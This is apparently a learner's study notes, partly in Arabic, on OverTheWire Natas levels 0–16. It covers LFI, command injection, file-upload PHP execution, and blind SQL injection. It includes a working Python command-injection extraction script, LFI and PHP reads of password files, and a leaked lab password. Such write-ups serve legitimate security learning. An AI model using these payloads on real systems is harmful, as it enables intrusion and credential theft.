# OverTheWire Natas 0–13

## Natas 0 — Source Code / Page Inspection

### Main lesson

أول خطوة في Web CTF هي فحص الصفحة نفسها ومصدر الـ HTML بدل افتراض وجود exploit معقد.

أشياء مهمة أفحصها:

* View Source
* HTML comments
* hidden fields
* links
* JavaScript
* HTTP requests/responses
* cookies
* paths وparameters

### Mindset

```text
Browser page
    ↓
Source code
    ↓
Comments / hidden information
    ↓
Credentials / clue
```

---

## Natas 1 — Client-Side Restrictions

الفكرة الأساسية في هذا النوع من المستويات:

> أي restriction موجود في JavaScript أو واجهة المتصفح ليس security boundary حقيقيًا.

لو الموقع يمنع action من خلال JavaScript، أقدر أفحص الـ request الحقيقي وأرسله مباشرة بدل الاعتماد على الـ UI.

### Lesson

```text
Client-side validation ≠ server-side security
```

---

## Natas 2 — Information Disclosure

من الأشياء التي يجب فحصها دائمًا:

* HTML source
* referenced resources
* directories
* predictable files
* `robots.txt`

وجود ملف أو resource غير ظاهر للمستخدم العادي ممكن يكشف معلومة مهمة.

### General workflow

```text
Page
 ↓
Source
 ↓
Referenced files/directories
 ↓
Interesting resource
 ↓
Secret
```

---

## Natas 3 — robots.txt / Hidden Paths

`robots.txt` مش آلية حماية.

لو الموقع يقول لمحركات البحث:

```text
Disallow: /something/
```

فده ممكن يكون **clue** لوجود path، وليس منعًا للوصول إليه.

### Lesson

```text
robots.txt
    ↓
Information disclosure
```

لازم دائمًا أجرب:

```text
/robots.txt
```

وأفحص الـ paths المذكورة فيه.

---

## Natas 4 — HTTP Headers / Referer

HTTP headers ممكن تكون جزءًا من منطق التحقق.

من الـ headers المهمة:

```text
Referer
User-Agent
Cookie
Authorization
Host
```

لو السيرفر يعتمد على header لتحديد هل الطلب مسموح أم لا، أقدر أعدّل الـ request نفسه بدل الاعتماد على المتصفح.

### Lesson

```text
HTTP request = method + URL + headers + body
```

مش مجرد الصفحة اللي شايفها في المتصفح.

---

## Natas 5 — Cookies

الـ Cookie جزء من الـ client → server communication.

لازم أفحص:

```text
Set-Cookie
Cookie
```

وأشوف هل الموقع بيخزن authorization state في cookie.

### Important concept

لو application logic يعتمد على قيمة موجودة عند الـ client:

```text
Browser
   ↓
Cookie
   ↓
Server
```

فالـ cookie نفسها لازم تتعامل معها كـ **untrusted input**.

---

## Natas 6 — Source Code / Hardcoded Secret

لما الموقع يعرض:

```text
View sourcecode
```

دي علامة قوية إن الـ source code نفسه جزء من الـ challenge.

أفحص:

* variables
* comparison logic
* included files
* hardcoded secrets
* PHP behavior

### Lesson

```text
Never assume source code is irrelevant.
```

في CTFs، الـ source أحيانًا هو الـ vulnerability أو الـ clue نفسه.

---

# Natas 7 — Local File Inclusion (LFI)

ا.

كان عندنا parameter:

```text
?page=
```

والـ PHP كان يستخدمه في `include()`.

الفكرة:

```text
index.php?page=some_file
```

لو الـ application يسمح بالتحكم في الملف الذي يتم `include()`، ممكن نحاول الوصول إلى local files.

### LFI

```text
User input
    ↓
include($_GET['page'])
    ↓
Local file
```

في Natas استخدمنا:

```text
/etc/natas_webpass/natas8
```

والـ password الذي استخرجناه كان:

```text
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
```

### Important lesson

`/etc/natas_webpass/` كان خارج web root، لكن LFI جعل التطبيق نفسه يقرأ الملف.

```text
Web root
/var/www/...

        ↓ LFI

/etc/natas_webpass/...
```

---

# Natas 8 — Reversible Encoding

هنا قابلنا سلسلة encoding transformations.

الـ PHP كان يعمل conceptually:

```php
bin2hex(
    strrev(
        base64_encode($secret)
    )
)
```

إذًا لاسترجاع الـ secret لازم نعكس العمليات **بالترتيب العكسي**.

Original:

```text
secret
 ↓
base64_encode
 ↓
strrev
 ↓
bin2hex
 ↓
output
```

Reverse:

```text
hex
 ↓
hex decode
 ↓
reverse
 ↓
base64 decode
 ↓
secret
```

استخدمنا:

```bash
echo 'HEX_HERE' | xxd -r -p | rev | base64 -d
```

### Important lesson

لما تشوف عدة transformations، ارسم الـ pipeline ثم اعكسه:

```text
A → B → C → D

للفك:

D → C⁻¹ → B⁻¹ → A⁻¹
```

---

# Natas 9 — Command Injection

هنا الـ input المستخدم للبحث في dictionary وصل إلى shell command.

الـ sink كان من النوع:

```php
passthru("grep -i $key dictionary.txt");
```

وكان فيه filtering لبعض shell operators:

```php
preg_match('/[;|&]/', $key)
```

### Important discovery

أنت بدأت بمحاولة:

```text
-v + /etc/natas_webpass/natas9
```

وبعدها أدركت أن الفكرة الأساسية ليست Gobuster أو brute force، وإنما **command injection عبر الـ search input**.

### Core concept

```text
User input
    ↓
grep command
    ↓
Shell
    ↓
Command injection
```

### Lesson

لما أشوف:

```php
system(...)
exec(...)
shell_exec(...)
passthru(...)
```

لازم أسأل:

> هل user-controlled input يدخل إلى shell command؟

---

# Natas 10 — Command Injection Without `;`

الفرق المهم عن Natas 9 أن بعض طرق command injection المباشرة لم تعد متاحة بسبب filtering.

أنت لاحظت تحديدًا أن:

```text
;
```

لم يعد متاحًا.

### Lesson

وجود blacklist لا يعني تلقائيًا أن command injection اختفى.

لازم أفهم:

```text
What characters are blocked?
What characters remain?
How does the shell parse the remaining input?
```

وده كان تمهيدًا مهمًا جدًا لفهم Natas 16 لاحقًا.

---

# Natas 11 — Cookie Manipulation / XOR

أكملت إلى Natas 11 ووصلت إلى مرحلة التعامل مع cookie مشفرة باستخدام XOR.

الفكرة الأساسية:

```text
plaintext
    XOR
key
    =
ciphertext
```

وXOR له خاصية مهمة:

```text
A XOR B = C

C XOR B = A
```

لذلك لو عندنا plaintext معروف جزئيًا، ممكن نستخدمه لاستنتاج الـ key أو التعامل مع ciphertext.

### Important lesson

XOR ليس encryption قويًا بحد ذاته؛ قوته تعتمد على طريقة استخدام المفتاح.

---

# Natas 12 — File Upload

في Natas 12 بدأنا نتعامل مع **file upload vulnerability**.

الفكرة العامة:

```text
Upload file
    ↓
Server saves file
    ↓
Can the uploaded file be interpreted as PHP?
```

الـ important questions:

* هل الـ server يتحقق من extension؟
* هل يتحقق من MIME type؟
* أين يتم تخزين الملف؟
* هل الملف قابل للتنفيذ؟
* هل يمكن التحكم في filename؟

### Lesson

رفع ملف ليس مجرد:

```text
upload → save
```

بل لازم أفهم:

```text
upload
 ↓
validation
 ↓
filename
 ↓
storage path
 ↓
server interpretation
```

---

# Natas 13 — Image Upload + PHP Execution

في Natas 13 استخدمت فكرة إخفاء PHP داخل ملف يبدو كأنه image.

بدأت بـ:

```text
GIF89a
```

كـ magic bytes / image signature.

وكان الملف يتم رفعه إلى مسار مثل:

```text
/var/www/natas/natas13/upload/plhp7foxfo.php
```

### Important concept

امتلاك file extension مثل:

```text
.php
```

مع محتوى يبدأ بشكل يشبه image يمكن أن يستغل ضعفًا في طريقة التحقق من upload.

لكن النقطة الأهم هي أن **الـ server تعامل مع الملف كـ PHP**.

### `file_get_contents()`

استخدمنا:

```php
file_get_contents(...)
```

للقراءة من filesystem.

اكتشفنا مشكلة مهمة جدًا:

```php
file_get_contents("/etc/natas_webpass/natas*")
```

لا يتعامل مع `*` مثل Bash.

في Bash:

```bash
cat /etc/natas_webpass/natas*
```

الـ shell يعمل glob expansion.

لكن PHP:

```php
file_get_contents("/etc/natas_webpass/natas*")
```

يتعامل مع `*` حرفيًا، وليس كـ wildcard expansion.

لذلك ظهر warning من النوع:

```text
failed to open stream: No such file or directory
```

### Lesson

لا تفترض أن كل البرامج تفسر wildcard بنفس طريقة shell.

```text
Shell:
* → glob expansion

PHP file_get_contents():
* → character عادي في path
```

---

# Natas 0–13 — Overall Progression

المستويات بدأت تعلمك أن الـ web application لازم يتفحص من عدة طبقات:

```text
Natas 0
Source / hidden information
        ↓
Natas 1
Client-side restrictions
        ↓
Natas 2–6
Files / source / headers / cookies
        ↓
Natas 7
LFI
        ↓
Natas 8
Encoding / reversing transformations
        ↓
Natas 9–10
Command injection
        ↓
Natas 11
XOR / cookie manipulation
        ↓
Natas 12–13
File upload / PHP execution
```

## Methodology I learned

لما أبدأ أي Web CTF، أمشي تقريبًا بالترتيب:

```text
1. Read the page
2. View source
3. Inspect comments
4. Inspect requests/responses
5. Check parameters
6. Check cookies
7. Check headers
8. Check robots.txt
9. Identify server-side sinks
10. Understand input validation
11. Test how the input reaches the backend
12. Build an oracle if the secret isn't directly returned
13. Automate repetitive testing
```

## Important Mindset

أهم حاجة اتعلمتها من Natas:

> **ما تبدأش بالـ payload. افهم أولًا data flow.**

اسأل:

```text
My input
   ↓
Where does it go?
   ↓
How is it interpreted?
   ↓
What parser processes it?
   ↓
Can I influence its syntax?
   ↓
What observable difference do I get?
```

وده ظهر بشكل واضح جدًا:

```text
Natas 7
input → PHP include()

Natas 9/10
input → shell command

Natas 14/15
input → SQL query

Natas 16
input → shell → command substitution → grep
```

وده أهم concept في المستويات كلها: **تحديد الـ interpreter الذي يستقبل input بتاعك** — HTML، PHP، SQL، shell، encoding، إلخ.

# Natas 14–16 — SQL Injection & Command Injection

## Natas 14 — Basic SQL Injection

### Vulnerable Code

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

The user input is concatenated directly into the SQL query.

This is vulnerable because the input is interpreted as part of the SQL syntax instead of being treated only as data.

### Debug Parameter

The source contains:

```php
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
}
```

Therefore:

```text
?debug=1
```

can be used to see the generated SQL query.

Important distinction:

```text
$_GET
```

comes from URL query parameters, while:

```text
$_POST
```

comes from POST data.

`$_REQUEST` can contain values from multiple request sources.

### SQL Injection Concept

Original query:

```sql
SELECT * FROM users
WHERE username="INPUT"
AND password="INPUT";
```

The important idea is to make the application interpret part of the input as SQL syntax.

A useful mental model:

```text
User input
    ↓
String concatenation
    ↓
SQL query
    ↓
SQL parser
```

If input can escape the intended string, it can alter the query logic.

### SQL Comments

MySQL supports comments such as:

```sql
#
```

and:

```sql
-- 
```

The space after `--` is important.

When using `#` inside a URL, remember that `#` normally starts a URL fragment and may not be sent to the server.

URL encoding:

```text
"  → %22
#  → %23
space → %20
```

### Important Lesson

The correct defense is **parameterized queries / prepared statements**, not manually filtering characters.

---

# Natas 15 — Boolean-Based Blind SQL Injection

The important code:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

$res = mysqli_query($link, $query);

if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
}
```

The application does **not** return the password.

Instead, it gives a Boolean-like response:

```text
This user exists.
```

or:

```text
This user doesn't exist.
```

This creates a **Boolean oracle**.

### Extracting a Character

MySQL string functions can inspect individual characters:

```sql
SUBSTRING(password, 1, 1)
```

Meaning:

```text
SUBSTRING(
    password,
    1,   -- starting position
    1    -- number of characters
)
```

For example:

```sql
SUBSTRING(password, 1, 1) = 'a'
```

asks:

> Is the first character of the password `a`?

For the second character:

```sql
SUBSTRING(password, 2, 1)
```

and so on.

### Case Sensitivity

MySQL string comparisons can be case-insensitive depending on the collation.

Therefore:

```sql
SUBSTRING(password, 1, 1) = 'a'
```

may also match `A`.

Use:

```sql
BINARY SUBSTRING(password, 1, 1) = 'a'
```

when a case-sensitive comparison is required.

### Automation

Instead of manually testing:

```text
a
b
c
...
Z
0
...
9
```

Python can automate the requests.

Character set:

```python
import string

chars = string.ascii_letters + string.digits
```

This contains:

```text
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
0123456789
```

The general algorithm:

```text
position = 1

    ↓

try every possible character

    ↓

send request

    ↓

check "This user exists."

    ↓

correct character found

    ↓

move to next position
```

This is not brute-forcing the entire password space.

It is extracting one character at a time using a Boolean oracle.

---

# Natas 16 — Command Injection

Important source:

```php
if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

The application executes:

```bash
grep -i "$key" dictionary.txt
```

using `passthru()`.

### Important Observation

The blacklist blocks:

```text
;
|
&
`
'
"
```

but does not block:

```text
$
(
)
```

Therefore shell command substitution is interesting:

```bash
$(command)
```

### Command Substitution

Example:

```bash
grep -i "$(echo hello)" dictionary.txt
```

The shell effectively does:

```text
$(echo hello)
      ↓
    hello
      ↓
grep -i "hello" dictionary.txt
```

So `$()` is executed by the shell before the outer command runs.

### The Oracle

The password is not inside `dictionary.txt`.

Instead, `dictionary.txt` is used to create an observable difference.

Conceptually:

```text
                $()
                 ↓
        test something about
             the password
                 ↓
          output / no output
                 ↓
        outer grep searches
         dictionary.txt
                 ↓
        different HTTP response
```

The important idea is:

```text
Inner command succeeds
        ↓
produces password-related output
        ↓
outer grep gets a non-empty pattern
        ↓
usually no dictionary match
```

versus:

```text
Inner command fails
        ↓
produces empty output
        ↓
outer grep receives an empty pattern
        ↓
matches dictionary output
```

Therefore the HTTP response becomes another Boolean oracle.

### Extracting the Password

Test one character at a time.

Conceptually:

```text
password prefix = ""

try a
try b
try c
...
try Z
try 0
...
try 9
```

When the HTTP response indicates the correct candidate:

```text
password += character
```

Then move to the next position.

Example:

```text
Position 1 → K
Position 2 → L
Position 3 → d
...
```

### Python Automation

The final automation used:

```python
import string
import requests

url = "http://natas16.natas.labs.overthewire.org"

auth = ("natas16", "PASSWORD")

chars = string.ascii_letters + string.digits

password = ""

for position in range(1, 40):
    found = False

    for char in chars:
        needle = f"$(grep ^{password}{char} /etc/natas_webpass/natas17)"

        params = {
            "needle": needle
        }

        r = requests.get(
            url=url,
            params=params,
            auth=auth
        )

        if "African" not in r.text:
            password += char
            print(f"[+] Position {position}: {char}")
            print(f"[+] Password: {password}")
            found = True
            break

    if not found:
        print("[-] No character found.")
        break

print(f"[+] Final password: {password}")
```

### Important Python Lesson

`requests` is a Python library, so normally install it inside a virtual environment:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install requests
```

The `string` module is part of Python itself:

```python
import string
```

No installation is required.

### Main Lessons From Natas 14–16

```text
Natas 14
SQL Injection
    ↓
modify SQL syntax

Natas 15
Blind SQL Injection
    ↓
SQL condition
    ↓
TRUE/FALSE
    ↓
response difference
    ↓
extract character

Natas 16
Command Injection
    ↓
Shell command substitution
    ↓
command output / no output
    ↓
grep response difference
    ↓
extract character
```

## Key Concepts to Remember

* SQL injection happens when user input is concatenated directly into SQL.
* Prepared statements prevent SQL input from becoming SQL syntax.
* `$_GET`, `$_POST`, and `$_REQUEST` represent different request input sources.
* `debug=1` was useful for viewing the generated query.
* `SUBSTRING()` can inspect individual characters.
* `BINARY` can force a case-sensitive comparison.
* Blind injection means the application doesn't directly return the secret.
* An **oracle** is an observable behavior that reveals information about a hidden value.
* Shell command substitution uses `$()`.
* `passthru()` executes a command through the shell.
* Command injection can turn an input parameter into shell syntax.
* `grep` can be used as part of an observable true/false condition.
* Automation turns hundreds/thousands of manual requests into a repeatable process.
